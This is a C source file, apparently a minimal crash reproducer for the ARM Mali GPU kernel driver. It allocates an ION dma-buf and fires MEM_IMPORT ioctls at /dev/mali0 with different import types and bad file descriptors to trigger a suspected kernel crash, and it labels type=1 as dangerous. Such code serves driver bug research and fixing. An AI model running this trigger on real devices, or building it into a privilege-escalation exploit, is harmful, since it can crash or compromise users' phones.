/*
 * mali_import_min.c — Absolute minimal Mali MEM_IMPORT crash reproducer
 *
 * Just does ONE single MEM_IMPORT call, varying the type field.
 * Previous crashes all had type=1 (UMM/dma-buf).
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o mali_import_min mali_import_min.c
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int ion_alloc_fd(void) {
    int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (ion < 0) return -1;

    struct {
        uint64_t len;
        uint64_t align;
        uint32_t heap_id_mask;
        uint32_t flags;
        int32_t  fd;
    } d = { .len = 4096, .align = 4096, .heap_id_mask = 1, .flags = 0, .fd = -1 };

    int r = ioctl(ion, 0xc0144900, &d);
    close(ion);
    if (r == 0 && d.fd >= 0) return d.fd;
    return -1;
}

static void test_import(int type, int dma_fd) {
    fprintf(stderr, "\n--- Testing MEM_IMPORT type=%d dma_fd=%d ---\n", type, dma_fd);

    pid_t pid = fork();
    if (pid == 0) {
        alarm(5);
        int mali = mali_open_ctx();
        if (mali < 0) { fprintf(stderr, "  Mali open failed\n"); _exit(1); }

        /* The actual MEM_IMPORT call */
        uint8_t buf[48];
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;  /* MEM_IMPORT */
        *(uint64_t*)(buf + 8) = (uint64_t)dma_fd;  /* phandle */
        *(uint64_t*)(buf + 16) = (uint64_t)type;    /* type */

        fprintf(stderr, "  Calling MEM_IMPORT ioctl...\n");
        int r = ioctl(mali, make_cmd(48), buf);
        int e = errno;
        uint32_t result = ((struct uk_header*)buf)->id;
        uint64_t gpu_va = *(uint64_t*)(buf + 32);
        uint64_t va_pages = *(uint64_t*)(buf + 40);

        fprintf(stderr, "  ioctl ret=%d errno=%d result=%u gpu_va=0x%llx pages=%llu\n",
                r, e, result, (unsigned long long)gpu_va, (unsigned long long)va_pages);

        if (r == 0 && result == 0 && gpu_va) {
            fprintf(stderr, "  SUCCESS! Imported at VA=0x%llx\n", (unsigned long long)gpu_va);
            /* Free it */
            memset(buf, 0, 16);
            ((struct uk_header*)buf)->id = 516;
            *(uint64_t*)(buf + 8) = gpu_va;
            ioctl(mali, make_cmd(16), buf);
        }

        close(mali);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        fprintf(stderr, "  *** CHILD KILLED by signal %d ***\n", WTERMSIG(status));
    else if (WIFEXITED(status))
        fprintf(stderr, "  Child exited with %d\n", WEXITSTATUS(status));
}

int main(void) {
    fprintf(stderr, "=== Mali MEM_IMPORT Minimal Crash Test ===\n");
    fprintf(stderr, "PID=%d UID=%d\n", getpid(), getuid());

    /* Step 1: Allocate an ION dma_buf */
    int dma_fd = ion_alloc_fd();
    fprintf(stderr, "[+] ION dma_buf fd=%d\n", dma_fd);
    if (dma_fd < 0) {
        fprintf(stderr, "[-] ION alloc failed\n");
        return 1;
    }

    /* Step 2: Test import with type=0 (USER_BUF) — probably safe */
    test_import(0, dma_fd);

    /* Step 3: Test import with type=1 (UMM/dma-buf) — suspected crash */
    fprintf(stderr, "\n*** DANGEROUS: type=1 (UMM/dma-buf) ***\n");
    test_import(1, dma_fd);

    /* Step 4: Test import with type=2 — probably just fails */
    test_import(2, dma_fd);

    /* Step 5: Test import with invalid fd */
    test_import(1, -1);
    test_import(1, 999);

    close(dma_fd);
    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
